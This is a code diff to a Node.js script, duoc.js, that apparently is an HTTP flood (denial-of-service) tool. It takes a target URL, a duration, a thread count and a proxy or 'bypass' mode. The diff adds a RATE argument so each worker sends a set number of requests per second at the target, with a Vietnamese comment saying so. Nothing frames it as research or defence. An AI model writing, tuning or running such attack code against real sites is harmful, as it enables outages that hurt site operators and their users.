@@ -5,8 +5,8 @@ const request = require('request'),
       cluster = require('cluster');
 
 async function main_process() {
-    if (process.argv.length !== 6) {
-        console.log(`Usage: node duoc.js <URL> <TIME> <THREADS> <bypass | proxy.txt>`);
+    if (process.argv.length !== 7) {
+        console.log(`Usage: node duoc.js <URL> <TIME> <THREADS> <bypass | proxy.txt> <RATE>`);
         process.exit(0);
     }
 
@@ -14,6 +14,7 @@ async function main_process() {
     const time = parseInt(process.argv[3]);
     const threads = parseInt(process.argv[4]);
     const proxyMode = process.argv[5];
+    const rate = parseInt(process.argv[6]);
 
     Array.prototype.remove_by_value = function(val) {
         for (let i = 0; i < this.length; i++) {
@@ -85,7 +86,11 @@ async function main_process() {
     }
 
     function thread() {
-        setInterval(run);
+        setInterval(() => {
+            for (let i = 0; i < rate; i++) {
+                run();
+            }
+        }, 1000); // Gửi <rate> request mỗi giây
     }
 
     async function main() {
